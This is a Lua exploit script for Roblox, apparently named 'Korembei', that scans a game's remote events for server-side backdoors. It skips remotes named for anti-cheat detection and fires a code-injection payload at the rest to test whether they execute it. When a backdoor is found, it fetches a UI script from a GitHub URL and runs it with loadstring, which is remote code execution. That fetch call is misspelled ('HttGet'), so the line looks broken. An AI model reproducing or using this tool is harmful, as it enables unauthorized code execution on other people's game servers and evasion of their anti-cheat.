--<< VARIABLES >>--
local backdoored = false
local vulnremote = nil
local timeout = 0.42
local blacklistedstrings = {"CheatDetected", "ExploitDetected","MouseLock","MouseLoc"}
local susstrings = {"Fire","Loadstring","Run","Code","Execute","Load","Script"}
local remotes = {}
local priority = {}

local testpartname = "Korembei_"..tostring(math.random(10000,99999))
local payload = [[Instance.new("FluidForceSensor", game:GetService("SoundService")).Name = "]]..testpartname..[["]]
local cleanup = [[game:GetService("SoundService"):FindFirstChild("]]..testpartname..[["):Destroy()]]

--<< FUNCTIONS >>--
local function checkremote(remote)
	for _, str in ipairs(blacklistedstrings) do
		if string.find(remote.Name:lower(), str:lower()) then
			return false
		end
	end
	if remote:FindFirstChild("__FUNCTION") or remote.Name == "__FUNCTION" or remote.Name == "CharacterSoundEvent" then
		return false
	end
	if remote.Parent.Parent then
		if remote.Parent.Parent.Name == "HDAdminClient" and remote.Parent.Name == "Signals" then
			return false
		end
		if remote.Parent.Name == "RobloxReplicatedStorage" 
			or remote.Parent.Name == "DefaultChatSystemChatEvents" then
			return false
		end
	end
	return true
end

local function checkpriority(remote)
	for _, str in ipairs(susstrings) do
		if string.find(remote.Name:lower(), str:lower()) then
			return true
		end
	end
	return false
end

local function fire(remote,args)
	if remote == nil then return end
	if remote:IsA("RemoteEvent") then
		pcall(function() remote:FireServer(args) end)
	elseif remote:IsA("RemoteFunction") then
		coroutine.wrap(function() return remote:InvokeServer(args) end)()
	end
end

local function checkpayload(remote)
	fire(remote,payload)
	local start = os.clock()
	while os.clock() - start < timeout do
		if game:GetService("SoundService"):FindFirstChild(testpartname) then
			return true
		end
		task.wait()
	end
	return false
end

--<< SCANNING >>--
print("Korembei > Scanning in progress...")

for _, remote in ipairs(game:GetDescendants()) do
	if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
		if checkremote(remote) then
			if checkpriority(remote) then
				print("Korembei > Found possible priority remote: "..remote.Name)
				table.insert(priority,remote)
			else
				print("Korembei > Found possible remote: "..remote.Name)
				table.insert(remotes,remote)
			end
		end
	end
end

print("Korembei > Scanning: "..#remotes+#priority.." remotes")

for _, remote in ipairs(priority) do
	print("Korembei > Checking priority remote: "..remote.Name)
	if checkpayload(remote) then
		print("Korembei > Found backdoor: "..remote.Name)
		backdoored = true
		vulnremote = remote
		break
	end
end

for _, remote in ipairs(remotes) do
	print("Korembei > Checking remote: "..remote.Name)
	if checkpayload(remote) then
		print("Korembei > Found backdoor: "..remote.Name)
		backdoored = true
		vulnremote = remote
		break
	end
end

--<< FINAL >>--
if backdoored then
	local remotepath = Instance.new("ObjectValue",game.Players.LocalPlayer)
	remotepath.Name = "Korembei_Remote_Path"
	remotepath.Value = vulnremote
	print("Korembei > Booting up GUI :3")
	task.wait(1/60)
	loadstring(game:HttGet("https://raw.githubusercontent.com/C-Dr1ve/Korembei/refs/heads/main/ui.lua"))()
else
	print("Korembei > No backdoor found :(")
	return
end
